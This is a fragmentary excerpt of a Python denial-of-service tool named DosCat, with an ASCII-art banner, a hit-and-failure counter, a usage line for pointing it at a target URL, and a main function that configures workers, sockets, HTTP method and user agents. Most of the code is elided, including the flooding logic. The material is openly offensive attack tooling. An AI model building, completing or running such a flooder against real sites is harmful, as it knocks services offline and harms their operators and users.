...
__/\\\\\\\\\\\\______________________________________/\\\\\\\\\______________________________        
 _\/\\\////////\\\_________________________________/\\\////////_______________________________       
  _\/\\\______\//\\\______________________________/\\\/______________________________/\\\______      
   _\/\\\_______\/\\\_____/\\\\\_____/\\\\\\\\\\__/\\\______________/\\\\\\\\\_____/\\\\\\\\\\\_     
    _\/\\\_______\/\\\___/\\\///\\\__\/\\\//////__\/\\\_____________\////////\\\___\////\\\////__    
     _\/\\\_______\/\\\__/\\\__\//\\\_\/\\\\\\\\\\_\//\\\______________/\\\\\\\\\\_____\/\\\______   
      _\/\\\_______/\\\__\//\\\__/\\\__\////////\\\__\///\\\___________/\\\/////\\\_____\/\\\_/\\__  
       _\/\\\\\\\\\\\\/____\///\\\\\/____/\\\\\\\\\\____\////\\\\\\\\\_\//\\\\\\\\/\\____\//\\\\\___ 
        _\////////////________\/////_____\//////////________\/////////___\////////\//______\/////____
...
DosCat_BANNER = 'DosCat v1.0 by XzenderCage'
    ...
    def stats(self):
        ...
        try:
            if self.counter[0] > 0 or self.counter[1] > 0:
                ...
                print("{0} DosCat strikes hit. ({1} Failed)".format(self.counter[0], self.counter[1]))
...
def usage():
    ...
    print(DosCat_BANNER)
    print()
    print(' USAGE: ./doscat.py <url> [OPTIONS]')
    print()
    print(' OPTIONS:')
...
def main():
    ...
    try:
        ...
        DosCat = DosCat(url)
        DosCat.useragents = useragents
        DosCat.nr_workers = workers
        DosCat.method = method
        DosCat.nr_sockets = socks
